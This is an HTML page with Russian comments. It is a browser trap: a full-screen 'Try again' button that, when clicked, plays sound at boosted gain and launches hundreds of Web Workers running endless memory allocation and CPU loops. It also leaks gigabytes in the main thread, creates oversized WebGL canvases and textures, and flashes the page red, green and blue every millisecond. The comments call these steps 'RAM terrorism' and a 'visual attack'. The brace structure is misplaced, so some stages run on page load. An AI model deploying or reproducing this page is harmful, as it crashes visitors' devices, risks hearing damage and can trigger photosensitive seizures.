<!DOCTYPE html>
<html>
<head>
  <style>
    #trapButton {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      font-size: 10rem;
      background: #9cff98;
      cursor: pointer;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <button id="trapButton">Попробуйте ещё раз</button>
  <audio id="nukeSound" src="sound.mp3"></audio>

  <script>
    const trigger = document.getElementById('trapButton');
    const audio = document.getElementById('nukeSound');

    trigger.onclick = () => {
      // 1. Активация звука (без изменений)
      audio.volume = 1;
      audio.play().catch(() => {
        const ctx = new AudioContext();
        const gainNode = ctx.createGain();
        gainNode.gain.value = 100;
        const source = ctx.createMediaElementSource(audio);
        source.connect(gainNode).connect(ctx.destination);
        audio.play();
      });

      // 2. Оптимизированный CPU/GPU-хаос
      for(let i = 0; i < 300; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          const chunkSize = 100 * 1024 * 1024; // 100MB за итерацию
          let totalAllocated = 0;
          
          function allocateMemory() {
            try {
              const buffer = new ArrayBuffer(chunkSize);
              const view = new Uint32Array(buffer);
              
              // CPU-нагрузка без блокировки
              for(let i = 0; i < 1e6; i++) {
                view[i % (chunkSize/4)] = Math.random() * 0xFFFFFFFF;
              }
              
              totalAllocated += chunkSize;
              setTimeout(allocateMemory, 10);
            } catch(e) {
              setTimeout(() => allocateMemory(chunkSize * 0.9), 100);
            }
          }
          allocateMemory();
        `])));
      }
      for(let i = 0; i < 500; i++) { // Увеличено количество воркеров
    new Worker(URL.createObjectURL(new Blob([`
      const memoryFragmentation = [];
      let chunkSize = 250 * 1024 * 1024; // Старт с 250MB
      
      function allocate() {
        try {
          // Аллокация + заполнение памяти реальными данными
          const buffer = new ArrayBuffer(chunkSize);
          new Uint32Array(buffer).fill(0xDEADBEEF); // Заполнение 32-битными значениями
          memoryFragmentation.push(buffer);
          
          // Постепенное увеличение нагрузки
          chunkSize = Math.min(chunkSize * 1.2, 1024 * 1024 * 1024); // До 1GB за шаг
          setTimeout(allocate, 250); // Частичная асинхронность
        } catch(e) {
          chunkSize = 100 * 1024 * 1024; // Сброс при ошибке
          setTimeout(allocate, 1000);
        }
      }
      allocate();

      // Дополнительная CPU-нагрузка
      while(true) {
        const arr = new Array(1e6).fill({data: Math.random()});
        arr.sort(() => Math.random() - 0.5);
      }
    `])));
  }

  // 4. Дополнительный RAM-терроризм в основном потоке
  const mainMemoryLeak = [];
  setInterval(() => {
    mainMemoryLeak.push(
      new Float64Array(1024 * 1024 * 128) // 1GB Float64 массив
    );
  }, 5000);
};

      // 3. GPU-оптимизация
      let glCounter = 0;
      const gpuStress = setInterval(() => {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = 32768;  // Уменьшено до 32k
          canvas.height = 32768;
          
          const gl = canvas.getContext('webgl2');
          if(!gl) return;
          
          const texture = gl.createTexture();
          gl.bindTexture(gl.TEXTURE_2D, texture);
          gl.texImage2D(
            gl.TEXTURE_2D, 
            0, 
            gl.RGBA, 
            4096,  // Уменьшенный размер текстуры
            4096, 
            0, 
            gl.RGBA, 
            gl.UNSIGNED_BYTE, 
            null
          );
          
          if(++glCounter > 1000) clearInterval(gpuStress);
        } catch(e) {}
      }, 50);  // Увеличен интервал

      // 4. Визуальная атака (без изменений)
      trigger.style.display = 'none';
      document.body.style.animation = 'flash 0.001s infinite';

    // CSS-анимация
    document.head.innerHTML += `
      <style>
        @keyframes flash {
          0% { background: #ff0000; }
          50% { background: #00ff00; }
          100% { background: #0000ff; }
        }
      </style>
    `;
  </script>
</body>
</html>